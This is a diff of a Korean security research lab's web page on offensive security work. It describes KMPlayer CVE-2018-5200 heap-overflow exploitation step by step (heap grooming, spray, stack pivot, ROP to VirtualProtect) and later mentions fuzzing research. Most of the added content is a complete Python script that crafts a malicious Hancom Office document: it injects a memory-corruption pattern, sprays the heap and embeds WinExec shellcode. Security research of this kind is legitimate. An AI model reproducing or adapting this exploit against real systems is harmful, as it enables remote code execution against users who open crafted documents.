@@ -8,7 +8,7 @@ permalink: /research/
 
 ## Research
 
-![]({{ site.url }}{{ site.baseurl }}/images/respic/pwn.gif){: style="width: 40%; float: left; margin: 10px 10px"}  저희 연구실에서는 다양한 시스템에 대한 Offensive Security 연구를 수행하고 있습니다. 다음은 [CVE-2018-5200](https://www.boho.or.kr/krcert/secNoticeView.do?bulletin_writing_sequence=30113) RCE 취약점의 Exploit 데모 영상입니다. 이러한 RCE 취약점을 공격하는 과정에서 여러가지 시스템 지식 및 익스플로잇 기술을 터득 할 수 있습니다. 예를들어 아래는 KMPlayer CVE-2018-5200 의 분석보고서 중 일부분으로서, Heap Overflow 취약점을 유발시킨 이후 최종 RCE 까지의 흐름을 이끌어내는 과정에서 어떠한 연구들이 필요한지를 엿볼 수 있습니다 (취약점 위치등의 내용은 비공개).
+![]({{ site.url }}{{ site.baseurl }}/images/respic/pwn.gif){: style="width: 40%; float: left; margin: 10px 10px"}  저희 연구실에서는 다양한 시스템에 대한 Offensive Security 연구를 수행하고 있습니다. 왼쪽은 [CVE-2018-5200](https://www.boho.or.kr/krcert/secNoticeView.do?bulletin_writing_sequence=30113) RCE 취약점의 Exploit 데모 영상입니다. 이러한 RCE 취약점을 공격하는 과정에서 여러가지 시스템 지식 및 익스플로잇 기술을 터득 할 수 있습니다. 예를들어 아래는 KMPlayer CVE-2018-5200 의 분석보고서 중 일부분으로서, Heap Overflow 취약점을 유발시킨 이후 최종 RCE 까지의 흐름을 이끌어내는 과정에서 어떠한 연구들이 필요한지를 엿볼 수 있습니다 (취약점 위치등의 내용은 비공개).
 
 **힙 레이아웃 조작:** _동일한 바이트로만 구성된 페이로드로 Heap Overflow 를 길이제약 없이 (거의 없이) 길게 트리거 할수 있는 상황에서 어떻게 해야 VPTR 과 같은 실행흐름과 연관되는 포인터를 가지고있는 객체를 덮어쓸수 있는지 연구한다. 앞서 KMPlayer 가 사용하는 커스텀 힙 할당자는 2가지 정도의 size 를 기준으로 bin 을 관리하여 메모리를 할당하는 dl-malloc 스타일의 할당자임을 확인하였다. 이 경우 Windows 의 표준 LFH 와 같이 할당 알고리즘 자체가 구체적인 size 를 기반으로 할당위치를 찾는 경우보다 다양한 size 의 힙 객체들이 인접한 메모리공간에 존재할 수 있기때문에 힙 메모리 레이아웃 예측이 어려워진다._
 
@@ -34,19 +34,254 @@ _Windows 7, 8, 10 기준 64비트 운영체제의 32비트 어플리케이션의
 **쉘코드 실행:** _힙 레이아웃을 컨트롤하고 힙 스프레이를 성공적으로 할수있는 단계가 된 이후에는 ASLR 이 적용되지 않은 Base Image 로부터 스택피벗 등에 필요한 가젯을 찾고 ROP 로 RWX 메모리에 쉘코드를 위치시키고 점프하는것으로 계산기를 실행한다. 퍼징을 통한 버그발견 (3~4주), 버그의 분석및 이해 (1~2주), 힙 레이아웃 제어 (1~2주) 의 난이도에 비하면 ROP 및 쉘코드실행은 1~2시간 정도 소요되는 간단한 작업이다. 먼저 call [ecx-4] 로 EIP 를 가져오므로 [ecx] 에 ROP 체인을 위치시키고 xchg ecx, esp 로 스택을 피벗하면 곧바로 ROP 를 수행할 수 있다. xchg ecx, esp 가젯이 잘 없어서 push/pop 등을 조합하여 결과적으로 동일한 피벗을 수행하는 가젯을 0x00c35644 의 위치에서 찾았다. ROP 단계에 도달한 후에는 IAT 에 존재하는 VirtualProtect 를 이용해서 Heap Spray 속 쉘코드에 실행권한을 주고 쉘코드로 점프하면 시연 영상과 같이 계산기가 실행된다._
 
 
+<br><br><br><br>
 
-다음은 한컴오피스 RCE 취약점 Exploit 데모 영상입니다.
 ![]({{ site.url }}{{ site.baseurl }}/images/respic/pwn2.gif){: style="width: 50%; float: left; margin: 0px  0px"}
+왼쪽은 한컴오피스 문서파싱 프로그램의 RCE 취약점 Exploit 데모 영상입니다. 해당 버그는 힙 메모리에서의 Use-After-Free 와 같은
+취약점으로 인해 발생하게 되며, 이러한 버그를 RCE 까지 이끌어내는 과정에서는 Reverse Engineering (역공학) 이 필요하고, 효과적인
+역공학을 수행하기 위해서는 소프트웨어 개발에 관해서 심도있는 경험 및 지식이 필요합니다. 또한 역공학을 통해서 Exploit 을 개발하기
+위해서는 기본적인 프로그래밍 능력이 요구됩니다. 아래의 코드는 왼쪽 데모영상에서 사용된 RCE 를 수행하게 해주는 조작된 문서파일을
+생성하기 위한 파이썬 코드 예시를 보여줍니다. 이러한 Exploit 코드개발을 통해서 소프트웨어의 내부 동작 과정 및 프로그래밍의 원리등을
+심도있게 연구 할 수 있습니다. 
+
+```python
+from pythoncom import *
+import sys, zlib, struct, random, string
+
+# common stuffs
+p  = lambda x: struct.pack("<L", x)
+pq = lambda x: struct.pack("<Q", x)
+ph = lambda x: struct.pack("<H", x)
+pb = lambda x: struct.pack("<B", x)
+
+# STGM constants
+STGM_READ 		= 0x00000000
+STGM_READWRITE 	= 0x00000002
+STGM_SHARE_EXCLUSIVE 	= 0x00000010
+STGM_CONVERT 		= 0x00020000
+STGM_CREATE		= 0x00001000
+
+# STGC constants
+STGC_DEFAULT		= 0x0
+
+# STGTY constants
+STGTY_STORAGE		= 0x1
+STGTY_STREAM		= 0x2 
+STGTY_LOCKBYTES	= 0x3
+STGTY_PROPERTY		= 0x4
+
+# Winexec(calc.exe)
+SHELLCODE =  '''
+90 64 A1 30 00 00 00 8B 40 0C 8B 40 14 8B 00 8B 00
+8B 58 10 90 8B 7B 3C 90 03 FB 90 90 8B 7F 78 90
+03 FB 57 90 8B 77 20 90 03 F3 90 90 8B 4F 24 90
+03 CB 90 90 33 D2 90 68 57 69 6E 44 5F 81 C7 00
+00 00 01 90 42 AD 39 3C 03 75 F9 90 90 0F B7 54
+51 FE 5F 90 8B 77 1C 90 8B FB 90 90 03 F7 03 3C
+96 33 D2 90 33 C0 52 90 BD 63 61 6C 64 81 ED 00
+00 00 01 90 55 54 58 90 52 50 90 90 FF D7 90
+'''.replace('\n', '').replace(' ', '').decode('hex')
+
+
+def gen_random_str(N):
+	return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))
+
+def hexdump(src, length=16):
+        FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
+        lines = []
+        for c in xrange(0, len(src), length):
+                chars = src[c:c+length]
+                hex = ' '.join(["%02x" % ord(x) for x in chars])
+                printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
+                lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
+        return ''.join(lines)
+
+def zlib_inflate(data):
+	return zlib.compress(data)[2:-4]
+
+def zlib_deflate(data):
+	return zlib.decompress(data, -15)
+
+# payload length should be even number.
+def append_paratext(payload, end=0):
+	z = ''
+	l = len(payload)
+
+	# PARAHEADER
+	size = 24
+	tag = 66
+	level = 0
+	head = (size << 20) | (level << 10) | tag				
+	z += struct.pack('<I', head)
+	if end==1:
+		z += struct.pack('<I', (l/2 + 1) | 0x80000000) 
+	else:
+		z += struct.pack('<I', l/2 + 1) 
+	z += ''.join("00 00 00 00 0c 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00".split()).decode('hex')
+
+	# PARATEXT
+	if l > 4094:	# big
+		size = 0xFFF
+		tag = 67
+		level = 1
+		head = (size << 20) | (level << 10) | tag				
+		z += struct.pack('<I', head) + struct.pack('<I', l+2) + payload + '\x0d\x00'
+	else:
+		size = l + 2
+		tag = 67
+		level = 1
+		head = (size << 20) | (level << 10) | tag				
+		z += struct.pack('<I', head) + payload + '\x0d\x00'
+	
+	# PARACHARSHAPE
+	size = 16
+	tag = 68
+	level = 1
+	head = (size << 20) | (level << 10) | tag				
+	z += struct.pack('<I', head) + ''.join("00 00 00 00 00 00 00 00 43 00 00 00 00 00 00 00".split()).decode('hex')
+	
+	# LINESEG
+	size = 36
+	tag = 69
+	level = 1
+	head = (size << 20) | (level << 10) | tag				
+	z += struct.pack('<I', head) + ''.join("00 00 00 00 00 0c 00 00 e8 03 00 00 e8 03 00 00 52 03 00 00 58 02 00 00 00 00 00 00 18 a6 00 00 00 00 06 00".split()).decode('hex')
+	return z
+
+# change last word of tag 0x43(67) into 0x09(trigger 8 byte stack write)
+def modify_section0(dst_strm, src_strm):
+	stat = src_strm.Stat(STGC_DEFAULT)
+	s = zlib_deflate(src_strm.Read(stat[2]))
+	#print hexdump(s)	
+	# parse
+	z = ''		# modified data
+	index = 0
+	endmark = False
+	print 'processing tags...'
+	while index < len(s):				
+		head = struct.unpack('<I', s[index:index+4])[0]
+		#print "head : {}".format(hex(head))
+		size = (head & 0xfff00000) >> 20
+		level = (head & 0x000ffc00) >> 10
+		tag = (head & 0x000003ff)
+		index += 4
+		
+		# big record! [header][bigsize][payload]
+		if size == 0xFFF:
+			print 'tag {} is big!'.format(tag)
+			size = struct.unpack('<I', s[index:index+4])[0]
+			index += 4
+
+			print 'big size : ', size			
+			# check out big payload.
+			o = s[index:index+size]				
+
+			# not chaning the big size and header.			
+			z += struct.pack('<I', head) + struct.pack('<I', size) + o
+			index += size
+		# normal record!		
+		else:
+			o = s[index:index+size]
+
+			if tag == 72:		# table cell
+				# inject bug here!
+				o_pat = '410001000100'.decode('hex')
+				b_pat = '410044020100'.decode('hex')
+				if o.find( o_pat ) != -1:
+					o = o.replace(o_pat, b_pat)
+					print 'bug injected!'
+
+			# PARATEXT (to indicate the next PARAHEADER has endmarker)
+			if tag == 67:
+				# signature for "daehee"
+				if o.find('\x64\x00\x61\x00\x65\x00\x68\x00\x65\x00\x65\x00') != -1:
+					print 'next PARAHEADER is end marker...'
+					endmark = True
+				
+			# PARAHEADER (important)
+			if tag == 66 and endmark == True:				
+				if o[:4] == "\x01\x00\x00\x80":			# must remove end marker!
+					o = "\x01\x00\x00\x00" + o[4:]
+				head = (size << 20) | (level << 10) | tag
+				print 'removing current end marker...'
+
+			z += struct.pack('<I', head) + o
+			index += size			
+	#}}while
+
+	print 'heap spray...'
+	z += append_paratext( 'A'*0x5000000 + SHELLCODE )	
+
+	print 'end'
+	z += append_paratext('\x41\x00', 1)		# end marker (important)
+	
+	dst_strm.Write(zlib_inflate(z))
+
+def exploit(dst_stg, src_stg):
+	if src_stg == None or dst_stg == None:
+		print "[*] Invalid storage."
+		sys.exit(-1)
+
+	enum = src_stg.EnumElements()
+
+	for stat in enum:
+		if stat[1] == STGTY_STORAGE:
+			# Storage
+			name = stat[0]
+			sub_src_stg = src_stg.OpenStorage(name, None, STGM_READ | STGM_SHARE_EXCLUSIVE, None, 0)
+			sub_dst_stg = dst_stg.CreateStorage(name, STGM_READWRITE | STGM_CREATE | STGM_SHARE_EXCLUSIVE, 0, 0)
+			exploit(sub_dst_stg, sub_src_stg)
+
+		elif stat[1] == STGTY_STREAM:
+			name = stat[0]
+			src_strm = src_stg.OpenStream(name, None, STGM_READ | STGM_SHARE_EXCLUSIVE, 0)
+			dst_strm = dst_stg.CreateStream(name, STGM_READWRITE | STGM_CREATE | STGM_SHARE_EXCLUSIVE, 0, 0)
+
+			if (src_strm == None or dst_strm == None):
+				print "[*] Invalid stream."
+				sys.exit(-1)
+
+			if name[:7]=="Section":
+				modify_section0(dst_strm, src_strm)
+				continue
+				
+			src_strm.CopyTo(dst_strm, stat[2])
+
+if __name__ == '__main__':
+	print "[*] Start exploit."
+	
+	src_stg = StgOpenStorage(sys.argv[1], None, (STGM_READWRITE | STGM_SHARE_EXCLUSIVE), None, 0)
+	dst_stg = StgCreateDocfile('exp'+sys.argv[1], (STGM_READWRITE | STGM_SHARE_EXCLUSIVE |  STGM_CREATE), 0)
+
+	exploit(dst_stg, src_stg)
+
+	dst_stg.Commit(STGC_DEFAULT)
+
+	print "[*] End exploit"
+```
+
+
+<br><br><br><br>
+
+
+위와 같은 메모리 버그로 인한 보안 취약점들은 Fuzzing 이라는 방법으로 탐색을 자동화 할 수 있으며 관련해서 수많은
+연구들이 수행되고 있습니다. [Fuzzing@Home](http://fuzzcoin.gtisc.gatech.edu:8000) 은 이러한 Fuzzing 프로그램을
+비신뢰 이기종 단말로 구성된 분산 컴퓨팅 네트워크에서 효율적으로 수행할 수 있는 인프라를 구축한 연구입니다. 아래의 그림은
+Fuzzing@Home 시스템의 일부분으로, Google 의 libfuzzer 를 Web Assembly 바이너리로 포팅하여 웹 브라우저 엔진 내부에서
+실행시킬 수 있도록 한 것을 나타냅니다.
+
+![]({{ site.url }}{{ site.baseurl }}/images/respic/fuzzhome2.png){: style="width: 90%; float: left; margin: 10px 10px"}
+
+현재 퍼징을 통해 Google 에서는 수많은 메모리 버그들을 자동적으로 발견하고 패치하고 있습니다. 또한 컴파일러 보안 기술의 발달로 인해
+대다수의 메모리 버그들은 점점더 RCE Exploit 단계까지 가는데에 어려움이 있습니다. 저희 연구실에서는 전통적인 메모리 버그에 관한
+연구 뿐 만 아니라, 앞으로 IT 시장에서 클라우드 서버가 늘어날 것을 예상하여 <U>가상화 및 Container, SandBox 에 관한 보안문제, 임베디드 시스템
+및 드론시스템 등 여러가지 시스템에서 구성요소들 간의 상호작용에서 발생 할 수 있는 로직버그의 발견을 효과적으로 하기위한 연구</U> 또한 중점적으로 수행합니다.
 
 
 
 
-**Fuzzing with WebAssembly**.
 
 
-![]({{ site.url }}{{ site.baseurl }}/images/respic/fuzzhome2.png){: style="width: 70%; float: left; margin: 10px 10px"}
 
-
-[Fuzzing@Home](http://fuzzcoin.gtisc.gatech.edu:8000) 
 
 
